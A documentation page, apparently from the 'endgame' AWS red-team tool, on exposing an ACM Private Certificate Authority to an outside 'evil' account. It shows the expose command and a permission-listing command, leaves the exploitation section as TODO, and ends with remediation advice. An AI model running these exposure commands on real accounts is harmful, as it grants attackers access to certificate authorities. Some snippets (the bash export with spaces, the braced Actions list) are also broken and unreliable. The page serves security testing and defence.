# ACM Private Certificate Authority (PCA)

* [Steps to Reproduce](#steps-to-reproduce)
* [Exploitation](#exploitation)
* [Remediation](#remediation)
* [References](#references)

## Steps to Reproduce

* ‼️ If you are using the Terraform demo infrastructure, you must take some follow-up steps after provisioning the resources in order to be able to expose the demo resource. This is due to how ACM PCA works. For instructions, see the [Appendix on ACM PCA Activation](../appendices/acm-pca-activation.md)

* To expose the resource using `endgame`, run the following from the victim account:

```bash
export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil
export CERTIFICATE_ID=12345678-1234-1234-1234-123456789012

endgame expose --service acm-pca --name $CERTIFICATE_ID
```

* To view the contents of the ACM PCA resource policy, run the following:

```bash
export AWS_REGION=us-east-1
export VICTIM_ACCOUNT_ID=111122223333
export CERTIFICATE_ID=12345678-1234-1234-1234-123456789012
export CERTIFICATE_ARN = arn:aws:acm-pca:$AWS_REGION:$VICTIM_ACCOUNT_ID:certificate-authority/$CERTIFICATE_ID

aws acm-pca list-permissions --certificate-authority-arn $CERTIFICATE_ARN
```

* Observe that the contents of the overly permissive resource-based policy match the example shown below.

## Example

```bash
{
  "Permissions": [
    {
      "Actions": {
        "IssueCertificate",
        "GetCertificate",
        "ListPermissions"
      },
      "CertificateAuthorityArn": "arn:aws:acm:us-east-1:111122223333:certificate/12345678-1234-1234-1234-123456789012",
      "CreatedAt": 1.516130652887E9,
      "Principal": "acm.amazonaws.com",
      "SourceAccount": "111122223333"
    }
  ]
}
```

## Exploitation

```
TODO
```

## Remediation

> ‼️ **Note**: At the time of this writing, AWS Access Analyzer does **NOT** support auditing of this resource type to prevent resource exposure. **We kindly suggest to the AWS Team that they support all resources that can be attacked using this tool**. 😊

* **Trusted Accounts Only**: Ensure that AWS PCA Certificates are only shared with trusted accounts, and that the trusted accounts truly need access to the Certificates.
* **Ensure access is necessary**: For any trusted accounts that do have access, ensure that the access is absolutely necessary.
* **Restrict access to IAM permissions that could lead to exposing usage of your private CAs**: Tightly control access to the following IAM actions:
      - [acm-pca:GetPolicy](https://docs.aws.amazon.com/acm-pca/latest/APIReference/API_GetPolicy.html): Retrieves the policy on an ACM Private CA._
      - [acm-pca:PutPolicy](https://docs.aws.amazon.com/acm-pca/latest/APIReference/API_PutPolicy.html): _Puts a policy on an ACM Private CA._
      - [acm-pca:DeletePolicy](https://docs.aws.amazon.com/acm-pca/latest/APIReference/API_DeletePolicy.html): _Deletes the policy for an ACM Private CA._

Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaining/#cloudsplaining) to identify violations of least privilege in IAM policies. This can help limit the IAM principals that have access to the actions that could perform Resource Exposure activities. See the example report [here](https://opensource.salesforce.com/cloudsplaining/)

## References

* [Attaching a Resource-based Policy for Cross Account Access in ACM PCA](https://docs.aws.amazon.com/acm-pca/latest/userguide/pca-rbp.html)
* [GetPolicy](https://docs.aws.amazon.com/acm-pca/latest/APIReference/API_GetPolicy.html)
* [PutPolicy](https://docs.aws.amazon.com/acm-pca/latest/APIReference/API_PutPolicy.html)
* [DeletePolicy](https://docs.aws.amazon.com/acm-pca/latest/APIReference/API_DeletePolicy.html)

